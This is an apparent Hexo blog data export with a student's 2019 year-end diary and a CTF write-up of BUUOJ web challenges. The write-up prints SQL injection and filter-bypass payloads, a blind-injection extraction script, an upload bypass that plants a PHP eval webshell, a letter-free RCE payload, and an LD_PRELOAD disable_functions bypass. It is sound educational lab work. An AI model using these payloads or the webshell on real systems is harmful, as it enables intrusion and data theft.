还要准备5月份那个比赛的复赛。选择的方向是SDN，虽然会一点数通，但是这玩意听都没有听过。开始在思科的官网找资料学习，用队友的电脑搭建了一个EVE-NG使用思科设备进行测试。队友可能是忙着其他事情去了吧，也没有这么出力。自己能力也不足，还不会PYTHON。到了提交作品那一天什么东西都没有交上去。\n\n### 8月\n\n8月放假在家。因为不会python吃了很多亏，花了一个多月学习PYTHON。学了之后是真的好用!!\n\n### 9月\n\n又是开学，这个月开始密集打CTF比赛。这个月是护网杯、N1CTF只会写签到题。事后也没有跟着复现，错过了很多东西。\n\n### 10月\n\n这个月也是打打比赛。不过认识了一个其他学校过来的同学，之前也是打这类比赛的，比较兴奋，因为打比赛有了队友了。在这个月认识了一个叫十月的小姐姐，还加入了一个组织。加入之后开始有了方向，算是转折点吧。有更多来着他校的厉害队友一起打比赛，特别特别开心。月底开始准备软考。\n\n### 11月\n\n准备软考，一直在刷题。不过真题也只是刷了几套。这个月还有一个湖湘杯，3号初赛（也是答题）去年复赛都没有进去。9号的软考刚好碰上湖湘杯。今年有幸进入了复赛，9号才晚上开始解题，不过因为水平还是太差，没能进入决赛。去年有一个学长进入了复赛，今天他进入了决赛，看这样子可能明年也许我仅能去决赛划划水了（哈哈哈哈哈）。\n\n### 12月\n\n软考成绩公布，过线了。这个月又有一次四六级，我又参加了（报名特积极，考试不复习可能说的就是自己吧）。这个学期课少，但是要学的东西特别多。特别想要回到大一大二，但是这个是不可能的，只有自己抓紧时间好好学习，少玩，多学，多操作。\n\n### 最后\n\n希望新的一年里可以对自己严格一些，多学点东西。早睡早起!","source":"_posts/年末总结.md","raw":"---\ntitle: 年末总结\ndate: 2019-12-31 23:31:39\ntags:\nencrypt: enable\nenc_pwd: 7b7a53e239400a13bd6be6c91c4f6c4e\n---\n\n## 年末总结\n\n### 1月\n\n月初这个时候应该快要放假，但是自己已经在家，因为一些原因直接回去了，没有参加学校的考试。在家里从头学了一遍汇编。虽然开了汇编课程，但是上了课与学没没有是两回事！！跟着视频一边看一边做。\n\n### 2月\n\n二月是颓废的一个月，什么都没有学。只是在家里睡觉，吃饭，走亲戚。自己觉得过年其实也就那样吧，越大就月不太想过年。比开学时间早了一周去学校。\n\n### 3月\n\n月初，开学了。也是准备考试（补考）的时候，开学第二周考试，两天之内考8门考试。但是自己一点也不慌，知道自己什么水平，每次都是及格边缘，不会挂科，也不会好到哪里去。考试过后就是每天的上课。\n\n### 4月\n\n4月也是比较闲的一个月。除了每天的上课，就是逛逛网页，有什么新东西，还有就是和别人聊聊天。这个月要举办ACM校赛，要负责准备工作（卑微的工作人员）。\n\n###  5月\n\n参加了一个老师推荐的比赛，初赛是答题，复赛交作品，决赛完善作品。初赛因为实验室所在大楼举办计算机登记考试，不让进去！！只好在网吧参加考试，只拿到了56分，本以为凉了，但是破天荒的进入了复赛！复赛名单出来还是挺开心的。\n\n### 6月\n\n参加了老师的一个智能家居的项目。前期是看论文，看看这个方向的进展。大部分都是英文的看得有一点点头痛。后面因为队友也不太给力，自己也。。。。。。就这样凉了。参加了四六级考试（裸考）。考前不复习，考试到达考场就不想去了。还是硬着头皮进去了，听力就和听天书似的。\n\n###  7月\n\n月初又是考试周， 还要准备5月份那个比赛的复赛。选择的方向是SDN，虽然会一点数通，但是这玩意听都没有听过。开始在思科的官网找资料学习，用队友的电脑搭建了一个EVE-NG使用思科设备进行测试。队友可能是忙着其他事情去了吧，也没有这么出力。自己能力也不足，还不会PYTHON。到了提交作品那一天什么东西都没有交上去。\n\n### 8月\n\n8月放假在家。因为不会python吃了很多亏，花了一个多月学习PYTHON。学了之后是真的好用!!\n\n### 9月\n\n又是开学，这个月开始密集打CTF比赛。这个月是护网杯、N1CTF只会写签到题。事后也没有跟着复现，错过了很多东西。\n\n### 10月\n\n这个月也是打打比赛。不过认识了一个其他学校过来的同学，之前也是打这类比赛的，比较兴奋，因为打比赛有了队友了。在这个月认识了一个叫十月的小姐姐，还加入了一个组织。加入之后开始有了方向，算是转折点吧。有更多来着他校的厉害队友一起打比赛，特别特别开心。月底开始准备软考。\n\n### 11月\n\n准备软考，一直在刷题。不过真题也只是刷了几套。这个月还有一个湖湘杯，3号初赛（也是答题）去年复赛都没有进去。9号的软考刚好碰上湖湘杯。今年有幸进入了复赛，9号才晚上开始解题，不过因为水平还是太差，没能进入决赛。去年有一个学长进入了复赛，今天他进入了决赛，看这样子可能明年也许我仅能去决赛划划水了（哈哈哈哈哈）。\n\n### 12月\n\n软考成绩公布，过线了。这个月又有一次四六级，我又参加了（报名特积极，考试不复习可能说的就是自己吧）。这个学期课少，但是要学的东西特别多。特别想要回到大一大二，但是这个是不可能的，只有自己抓紧时间好好学习，少玩，多学，多操作。\n\n### 最后\n\n希望新的一年里可以对自己严格一些，多学点东西。早睡早起!","slug":"年末总结","published":1,"updated":"2020-02-06T08:17:02.164Z","_id":"ck4wg88b10001yk7edqhj7r35","comments":1,"layout":"post","photos":[],"link":""},{"title":"buuoj刷题记录10-极客大挑战web2","date":"2020-01-24T15:37:07.000Z","_content":"\n## 极客大挑战web\n\n### LoveSQL\n\nfuzz了一下发现过滤了空格，单引号报错。如果查询数据为空，返回密码错误\n\n常规操作\n\n1. #### order by判断字段，字段为3\n\n![](/pic/38.png)\n\n`?username='union+select+1,group_concat(username,',',password),3+from+l0ve1ysq1+limit+0,1+%23&password=123 `\n\n![](/pic/39.png)\n\n2. #### union确定回显，回显位置为2，3\n\n`?username='union+select+1,2,3+%23&password=123`\n\n![](/pic/40.png)\n\n3. #### 查数据库\n\n`?username='union+select+1,database(),3+%23&password=123`\n\n![](/pic/41.png)\n\n4. #### 查表\n\n`?username='union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema='geek'+%23&password=123`\n\n![](/pic/42.png)\n\nl0ve1ysq1、geekuser\n\n5. #### 查列名\n\n`?username='union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema='geek'+and+table_name='l0ve1ysq1'+%23&password=123`\n\n![](/pic/43.png)\n\n`?username='union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema='geek'+and+table_name='geekuser'+%23&password=123`\n\n![](/pic/44.png)\n\n6. #### 查数据\n\n`?username='union+select+1,group_concat(username,',',password),3+from+geekuser+limit+0,1+%23&password=123`\n\ngeekuser只有一个admin\n\n![](/pic/45.png)\n\nl0ve1ysq1表中发现了flag\n\n`?username='union+select+1,group_concat(username,',',password),3+from+l0ve1ysq1+limit+0,1+%23&password=123` \n\n![](/pic/46.png)\n\n\n\n### BabySQL\n\nfuzzing一下，将union,select,and,or,where,from删除\n\n此时可以selselectect将select删除之后就变成了sel ~~select~~ ect\n\n因为和上面的一样，直接查询数据库\n\n1. #### 查数据库\n\n`?username='uniunionon+selselectect+1,database(),3--+&password=123`\n\n数据库名还是geek\n\n2. #### 查询表\n\n```\n?username='uniunionon+selselectect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema='geek'--+&password=123\n```\n\nb4bsql,geekuser\n\n3. #### 查列名\n\n`?username='uniunionon+selselectect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_schema='geek'+anandd+table_name='b4bsql'--+&password=123`\n\n列名还是id,username,password\n\n4. #### 查询数据\n\n`?username='uniunionon+selselectect+1,group_concat(username,passwoorrd),3+frfromom+b4bsql--+&password=123`\n\n![](/pic/47.png)\n\n成功拿到flag\n\n### Http\n\n打开BP，开启拦截，查看site map发现有一个secret.php\n\n![](/pic/48.png)\n\n访问即可\n\n根据提示修改http头\n\n```\nGET /Secret.php HTTP/1.1\nHost: node3.buuoj.cn:27400\nAccept-Encoding: gzip, deflate\nAccept: */*\nX-Forwarded-for:127.0.0.1\nAccept-Language: en\nReferer:https://www.Sycsecret.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Syclover/20100101 Firefox/72.0\nConnection: close\n\n```\n\n### BuyFlag\n\n点进去有一个payflag界面,\n\n根据提示，\n\n```\nIf you want to buy the FLAG:\nYou must be a student from CUIT!!!\nYou must be answer the correct password!!! \n\nOnly Cuit's students can buy the FLAG\n```\n\n页面最后有一段注释\n\n```\n<!--\n\t~~~post money and password~~~\nif (isset($_POST['password'])) {\n\t$password = $_POST['password'];\n\tif (is_numeric($password)) {\n\t\techo \"password can't be number</br>\";\n\t}elseif ($password == 404) {\n\t\techo \"Password Right!</br>\";\n\t}\n}\n-->\n```\n\n这一段注释是对输入的`password`作比较，输入的是404，且能绕过`is_numeric()`函数。\n\n在数字之后面加一个字符就变成了字符串类型，即可绕过。最后面的是弱类型的判断，加了字符之后还是符合的\n\n![](/pic/49.png)\n\n抓包发现有cookie, user=0，改成=1，变成了\n\n```\nyou are Cuiter\nPlease input your password!!\n```\n\n传入数据`password=404a&money=999999999`，他说数据太长，只能传入八位。\n\n之前在南邮的平台上做过一道pass check题目PHP版本是5.3，传入数组即可绕过\n\n`password=404a&money[]=`\n\n### Upload\n\n上传PHP一句话被过滤\n\n![](/pic/50.png)\n\n换成图片后缀jpg进行%00截断，还是被过滤\n\n![](/pic/51.png)\n\n尝试php2,php3,php5都被过滤\n\n![](/pic/52.png)\n\n![](/pic/53.png)\n\n![](/pic/54.png)\n\n只有phtml没有被过滤\n\n![](/pic/55.png)\n\n内容不能出现`<?`可以换成js的写法\n\n![](/pic/56.png)\n\n```\n<script language=\"php\">\neval($_POST['cmd']);\n</script>\n```\n\n再上传提示必须是图片，添加gif文件头`GIF89a`\n\n![](/pic/57.png)\n\n使用蚁剑，菜刀连接，找到flag\n\n![](/pic/58.png)\n\n### HardSQL\n\nfuzz测试\n\n`AND,BINARY,BY,CHAR,CHAR_LENGTH,CHARACTER,CHARACTER_LENGTH,CLASSIFIER,DROP,HAVING,INSERT,INTO,MODIFIES,NCHAR,NULLIF,SPECIFIC,SPECIFICTYPE,SUBSTRING,SUBSTRING_REGEX,UNION,VARBINARY,VARCHAR,+,/,!,*,||,&&,<,>,ascii,%20,%09`被过滤\n\n输入错误还会报出sql语句错误，考虑报错注入\n\n1. #### 查数据库\n\n   `?username=admin'or(updatexml(0,concat(0,(select(database())),0))%23`还是geek\n\n2. #### 查表\n\n   `?username=admin'or(updatexml(0,concat(0,(select(concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),0))%23`\n\n   H4rDsq1\n\n3. #### 查列名（应该还是只有id,usname,password）\n\n4. #### 查数据\n\n   `?username=admin'or(updatexml(0,concat(0,(select(concat(password))from(H4rDsq1))),0))%23&password=123`\n\n   `?username=admin'or(updatexml(0,concat(0,(select(reverse(password))from(H4rDsq1))),0))%23&password=123`\n   \n   因为flag超出了32个字符，floor报错注入能显示64个字符，但是by被过滤（本菜鸡找不到解决的办法）。 字符截取函数substr,mid被过滤，使用reverse函数。\n\n\n\n### FinalSQL\n\nfuzz之后发现被过滤的关键字有\n\n![](/pic/59.png)\n\n题目提示有盲注，还给了一个含有ID的界面。注入点再id处，不再是之前的输入框\n\n![](/pic/60.png)\n\n![](/pic/61.png)\n\n根据括号内的数字不同，返回的界面不同，和没被过滤的关键字可以使用盲注\n\n编写盲注脚本\n\n```\n# -*- coding: utf-8 -*-\nimport requests\n\ndef get(payload):\n    url = 'http://f408e803-8b3e-4c4e-883e-3fb61e29303f.node3.buuoj.cn/search.php?id=1=('+payload+')'\n    html = requests.get(url)\n    # print(html)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print('*-*-*-*-*-*', mid)\n            if 'others' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tabls(db):\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''+db+'\\')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''+table+'\\')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea(s_payload)\n\n\n# get_database()\n\n# get_tabls('geek') #F1naI1y,Flaaaaag\n#\n# get_columns('F1naI1y') # id,username,password\n# get_columns('Flaaaaag') # id,fl4gawsl\n\n# get_data('fl4gawsl','Flaaaaag')\nget_data('id,username,password','F1naI1y')\n```\n\n跑出来有两个表F1naI1y,Flaaaaag\n\nF1naI1y表还是只有id,username,password\n\nFlaaaaag表包括id,fl4gawsl\n\n#### RCE ME\n\n打开题目有源码\n\n```\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n            $code=$_GET['code'];\n                    if(strlen($code)>40){  \n                                        die(\"This is too Long.\");\n                                                }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                                        die(\"NO.\");\n                                                }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n\n// ?>\n```\n\n 传入一个code参数，长度不能大于40，不能包含大小写字母和数字\n\n可以使用取反或者异或拼凑函数\n\n`?code=$_=(~?>);$$_{%27__%27}($$_{%27_%27});&_=phpinfo()&__=assert`\n\n\n\n**%A0%AF%B0%AC%AB**是`_GET的取反的值，$$_{%27__%27}($$_{%27_%27})`就相当于 `$_GET{'__'}($_GET{'_'}) `  联合起来就是`assert(phpinfo())`\n\n\n\n**关于assert函数**\n\nPHP 5 assert ( [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, string `$description` ] ) : bool\n\nPHP 7 assert ( [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, Throwable `$exception` ] ) : bool\n\n**assert()** 会检查指定的 `assertion` 并在结果为 **`FALSE`** 时采取适当的行动。\n\n如果 `assertion` 是字符串，它将会被 **assert()** 当做 PHP 代码来执行。 `assertion` 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 `assertion` 表达式。 这意味着如果你传入了 boolean 的条件作为 `assertion`，这个条件将不会显示为断言函数的参数；在调用你定义的 [assert_options()](https://www.php.net/manual/zh/function.assert-options.php) 处理函数时，条件会转换为字符串，而布尔值 **`FALSE`** 会被转换成空字符串。\n\n\n\n\n\n![](/pic/64.png)\n\n先查看phpinfo()\n\n![](/pic/62.png)\n\n禁用了很多执行系统命令的函数\n\n![](/pic/63.png)\n\n```\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl\n```\n\n扫描当前目录 \n\npost 数据： `_=print_r(scandir(%27./%27))&__=assert`\n\n```\nArray (    [0] => .    [1] => ..    [2] => index.php )\n```\n\n扫描根目录\n\npost数据：`_=print_r(scandir(%27/%27))&__=assert`\n\n```\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => flag [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => readflag [16] => root [17] => run [18] => sbin [19] => srv [20] => sys [21] => tmp [22] => usr [23] => var ) \n```\n\n发现有一个flag文件和一个readflag文件。尝试读取内容\n\n读取flag中的文件是空的；\n\npost数据：`_=var_dump(file_get_contents(%27/flag%27))&__=assert`\n\npost数据：`_=var_dump(file_get_contents(%27/readflag%27))&__=assert`\n\n```\nstring(8856) \"ELF\u0002\u0001\u0001\u0003>\u0001�\u0006@�\u001a@8 @\u001f\u001e\u0006\u0005@@@�\u0001�\u0001\b\u0003\u00048\u00028\u00028\u0002\u001c\u001c\u0001\u0001\u0005\f \f \u0001\u0006� � � x\u0002�\u0002 \u0002\u0006� � � �\u0001�\u0001\b\u0004\u0004T\u0002T\u0002T\u0002DD\u0004P�td\u0004�\b�\b�\b<<\u0004Q�td\u0006\u0010R�td\u0004� � � (\u0002(\u0002\u0001/lib64/ld-linux-x86-64.so.2\u0004\u0010\u0001GNU\u0002\u0006 \u0004\u0014\u0003GNU�íf­CI�`[Xa\f���V�\u0001\u0001\u0001Q \u001a\u0012?\u0012m 8\u0012| � \u000b\u0012)\"\u0012\u0012!\u0012libc.so.6setuidsetegidsystemseteuid__cxa_finalizesetgid__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.2.5\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0001\u0001\u0001\u0010u\u001ai \u0002�� \b�\u0007� \b`\u0007H\u0010 \bH\u0010 �\u000f \u0006\u0001�\u000f \u0006\u0003�\u000f \u0006\u0004�\u000f \u0006\u0006�\u000f \u0006\u0007�\u000f \u0006 \u0018\u0010 \u0007\u0002 \u0010 \u0007\u0005(\u0010 \u0007\b0\u0010 \u0007 8\u0010 \u0007\u000bH��\bH�\u0005� H��t\u0002��H��\b��5� �%� \u000f\u001f@�%� h������%� h\u0001������%� h\u0002������%� h\u0003�����%� h\u0004�����%b f�1�I��^H��H���PTL�\u0005�\u0001H� s\u0001H�=\f\u0001�\u0015\u000e �\u000f\u001fDH�=y H�\u0005y UH)�H��H��\u000ev\u0015H�\u0005�\b H��t ]��f\u000f\u001fD]�\u000f\u001f@f.\u000f\u001f�H�=9 H�52 UH)�H��H��\u0003H��H��?H\u0001�H��t\u0018H�\u0005�\b H��t\f]��f\u000f\u001f�]�\u000f\u001f@f.\u000f\u001f��=�\b u'H�=�\b UH��t\fH�=�\b � ����H���]�\u0005�\b \u0001��\u000f\u001f@f.\u000f\u001f�H�=A\u0006 H�?u\u000b�^���f\u000f\u001fDH�\u0005)\b H��t�UH����]�@���UH����������~������_������@���H�=���\u001f����]�f.\u000f\u001f�f�AWAVA��AUATL�%�\u0005 UH�-�\u0005 SI��I��L)�H��\bH��\u0003����H��t 1�\u000f\u001f�L��L��D��A�\u0014�H��\u0001H9�u�H��\b[]A\\A]A^A_Ðf.\u000f\u001f���H��\bH��\b�\u0001\u0002/bin/cat /flag\u0001\u001b\u0003;8\u0006l�������������T\f����l��������,\u0001\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001\u0007\u0010\u0014\u001c����+\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001$\u001c����`\u000e\u0010F\u000e\u0018J\u000f\u000bw\b�?\u001a;*3$\"\u0014D\u0018���\b\u001c\\@���TA\u000e\u0010�\u0002C \u0006\u0002O\f\u0007\bD|����eB\u000e\u0010�\u0002B\u000e\u0018�\u0003E\u000e �\u0004B\u000e(�\u0005H\u000e0�\u0006H\u000e8�\u0007M\u000e@r\u000e8A\u000e0A\u000e(B\u000e B\u000e\u0018B\u000e\u0010B\u000e\b\u0014�����\u0002�\u0007`\u0007\u0001\u0001\f\u0018\u0006 �\b\u0019� \u001b\b\u001a� \u001c\b���o�\u0002\u0005�\u0003\u0006�\u0002 �\u000b\u0018\u0015\u0003\u0010 \u0002x\u0014\u0007\u0017�\u0005\u0007�\u0004\b� \u0018���o\b���o�\u0004���o\u0001���o�\u0004���o\u0003� F\u0006V\u0006f\u0006v\u0006�\u0006H\u0010 GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516\u0003\u00018\u0002\u0003\u0002T\u0002\u0003\u0003t\u0002\u0003\u0004�\u0002\u0003\u0005�\u0002\u0003\u0006�\u0003\u0003\u0007�\u0004\u0003\b�\u0004\u0003 �\u0004\u0003 �\u0005\u0003\u000b\u0018\u0006\u0003\f0\u0006\u0003 �\u0006\u0003\u000e�\u0006\u0003\u000f�\b\u0003\u0010�\b\u0003\u0011�\b\u0003\u0012 \u0003\u0013� \u0003\u0014� \u0003\u0015� \u0003\u0016� \u0003\u0017�\u000f \u0003\u0018\u0010 \u0003\u0019@\u0010 \u0003\u001aP\u0010 \u0003\u001b\u0001\u0004��\f\u0001\u0015� \u0019\u0002\u000e�\u0006\u001b\u0002\u000e\u0010\u0007.\u0002\u000e`\u0007D\u0001\u001aP\u0010 \u0001S\u0001\u0014� z\u0002\u000e�\u0007�\u0001\u0013� �\u0004��\u0001\u0004���\u0001\u0012\b �\u0001\u0015� \u0004���\u0013� �\u0001\u0016� �\u0013� �\u0011�\b \u0001\u0001\u0018\u0010 \u0001\u0012\u000e�\b\u00020\u0001 �\u0001 \u0019@\u0010 L\u0001\u0010\u0019P\u0010 *\u0001\u0012\u000f�\bS\u0001\u0012g\u0001\u0012�\u0001\u0010\u0019@\u0010 �\u0001 �\u0001\u0011\u0002\u0019H\u0010 �\u0001\u0011\u0010�\b\u0004�\u0001\u0012\u000e0\be�\u0010\u001aX\u0010 �\u0001\u0012\u000e�\u0006+�\u0001\u0010\u001aP\u0010 �\u0001\u0012\u000e�\u0007T�\u0001\u0012�\u0001 \u0007\u0002\u0011\u0002\u0019P\u0010 \u0013\u0002 -\u0002\u0012A\u0002\"�\u0001\u0012\u000b\u0018\u0006]\u0002\u0012r\u0002\u0012crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6972__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreadflag.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5setegid@@GLIBC_2.2.5seteuid@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment\u001b\u0001\u00028\u00028\u0002\u001c\u0001#\u0007\u0002T\u0002T\u0002 \u00041\u0007\u0002t\u0002t\u0002$\u0004D���o\u0002�\u0002�\u0002\u001c\u0005\bN\u000b\u0002�\u0002�\u0002 \u0001\u0006\u0001\b\u0018V\u0003\u0002�\u0003�\u0003�\u0001^���o\u0002�\u0004�\u0004\u0018\u0005\u0002\u0002k���o\u0002�\u0004�\u0004 \u0006\u0001\bz\u0004\u0002�\u0004�\u0004�\u0005\b\u0018�\u0004B�\u0005�\u0005x\u0005\u0018\b\u0018�\u0001\u0006\u0018\u0006\u0018\u0006\u0017\u0004�\u0001\u00060\u00060\u0006`\u0010\u0010�\u0001\u0006�\u0006�\u0006\b\b�\u0001\u0006�\u0006�\u0006\u0002\u0002\u0010�\u0001\u0006�\b�\b \u0004�\u0001\u0002�\b�\b\u0013\u0004�\u0001\u0002�\b�\b<\u0004�\u0001\u0002 \f\u0001\b�\u000e\u0003� � \b\b\b�\u000f\u0003� � \b\b\b�\u0001\u0003� � \b\b�\u0006\u0003� � �\u0001\u0006\b\u0010�\u0001\u0003�\u000f �\u000f0\b\b�\u0001\u0003\u0010 \u0010@\b\b�\u0001\u0003@\u0010 @\u0010\u0010\b�\b\u0003P\u0010 P\u0010\b\u0001\u0003\u0001\u00010P\u0010-\u0001\u0001\u0001\u0002�\u0010�\u0006\u001d/\b\u0018 \u0003@\u0017�\u0002\u0001\u0011\u0003�\u0019\f\u0001\u0001\" \n```\n\n是linux可执文件\n\n连接蚁剑 payload :`?code=$_=(~%A0%B8%BA%AB);$$_{%27__%27}($$_{%27_%27});&__=assert&_=eval($_POST['cmd'])`\n\n应该是要绕过disable_function,从而执行readflag，项目地址\n\n```\nhttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n```\n\n只有/tmp有文件修改权限，上传`bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so`到/tmp下\n\n最后payload:\n\n`?code=$_=(~%A0%B8%BA%AB);$$_{%27__%27}($$_{%27_%27});&__=assert&_=include \"/tmp/bypass_disablefunc.php\"&cmd=/readflag&outpath=/tmp/xx&sopath=/tmp/bypass_disablefunc_x64.so`\n\n输出为\n\n```\n example: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so\n\ncmdline: /readflag > /tmp/xx 2>&1\n\noutput:\nflag{6e16639a-9eca-45b8-a972-e61da4146393}\n```\n\n","source":"_posts/buuoj刷题记录10-极客大挑战web2.md","raw":"---\ntitle: buuoj刷题记录10-极客大挑战web2\ndate: 2020-01-24 23:37:07\ntags:\n- ctf\n- 极客大挑战\n- web\n---\n\n## 极客大挑战web\n\n### LoveSQL\n\nfuzz了一下发现过滤了空格，单引号报错。如果查询数据为空，返回密码错误\n\n常规操作\n\n1. #### order by判断字段，字段为3\n\n![](/pic/38.png)\n\n`?username='union+select+1,group_concat(username,',',password),3+from+l0ve1ysq1+limit+0,1+%23&password=123 `\n\n![](/pic/39.png)\n\n2. #### union确定回显，回显位置为2，3\n\n`?username='union+select+1,2,3+%23&password=123`\n\n![](/pic/40.png)\n\n3. #### 查数据库\n\n`?username='union+select+1,database(),3+%23&password=123`\n\n![](/pic/41.png)\n\n4. #### 查表\n\n`?username='union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema='geek'+%23&password=123`\n\n![](/pic/42.png)\n\nl0ve1ysq1、geekuser\n\n5. #### 查列名\n\n`?username='union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema='geek'+and+table_name='l0ve1ysq1'+%23&password=123`\n\n![](/pic/43.png)\n\n`?username='union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema='geek'+and+table_name='geekuser'+%23&password=123`\n\n![](/pic/44.png)\n\n6. #### 查数据\n\n`?username='union+select+1,group_concat(username,',',password),3+from+geekuser+limit+0,1+%23&password=123`\n\ngeekuser只有一个admin\n\n![](/pic/45.png)\n\nl0ve1ysq1表中发现了flag\n\n`?username='union+select+1,group_concat(username,',',password),3+from+l0ve1ysq1+limit+0,1+%23&password=123` \n\n![](/pic/46.png)\n\n\n\n### BabySQL\n\nfuzzing一下，将union,select,and,or,where,from删除\n\n此时可以selselectect将select删除之后就变成了sel ~~select~~ ect\n\n因为和上面的一样，直接查询数据库\n\n1. #### 查数据库\n\n`?username='uniunionon+selselectect+1,database(),3--+&password=123`\n\n数据库名还是geek\n\n2. #### 查询表\n\n```\n?username='uniunionon+selselectect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema='geek'--+&password=123\n```\n\nb4bsql,geekuser\n\n3. #### 查列名\n\n`?username='uniunionon+selselectect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_schema='geek'+anandd+table_name='b4bsql'--+&password=123`\n\n列名还是id,username,password\n\n4. #### 查询数据\n\n`?username='uniunionon+selselectect+1,group_concat(username,passwoorrd),3+frfromom+b4bsql--+&password=123`\n\n![](/pic/47.png)\n\n成功拿到flag\n\n### Http\n\n打开BP，开启拦截，查看site map发现有一个secret.php\n\n![](/pic/48.png)\n\n访问即可\n\n根据提示修改http头\n\n```\nGET /Secret.php HTTP/1.1\nHost: node3.buuoj.cn:27400\nAccept-Encoding: gzip, deflate\nAccept: */*\nX-Forwarded-for:127.0.0.1\nAccept-Language: en\nReferer:https://www.Sycsecret.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Syclover/20100101 Firefox/72.0\nConnection: close\n\n```\n\n### BuyFlag\n\n点进去有一个payflag界面,\n\n根据提示，\n\n```\nIf you want to buy the FLAG:\nYou must be a student from CUIT!!!\nYou must be answer the correct password!!! \n\nOnly Cuit's students can buy the FLAG\n```\n\n页面最后有一段注释\n\n```\n<!--\n\t~~~post money and password~~~\nif (isset($_POST['password'])) {\n\t$password = $_POST['password'];\n\tif (is_numeric($password)) {\n\t\techo \"password can't be number</br>\";\n\t}elseif ($password == 404) {\n\t\techo \"Password Right!</br>\";\n\t}\n}\n-->\n```\n\n这一段注释是对输入的`password`作比较，输入的是404，且能绕过`is_numeric()`函数。\n\n在数字之后面加一个字符就变成了字符串类型，即可绕过。最后面的是弱类型的判断，加了字符之后还是符合的\n\n![](/pic/49.png)\n\n抓包发现有cookie, user=0，改成=1，变成了\n\n```\nyou are Cuiter\nPlease input your password!!\n```\n\n传入数据`password=404a&money=999999999`，他说数据太长，只能传入八位。\n\n之前在南邮的平台上做过一道pass check题目PHP版本是5.3，传入数组即可绕过\n\n`password=404a&money[]=`\n\n### 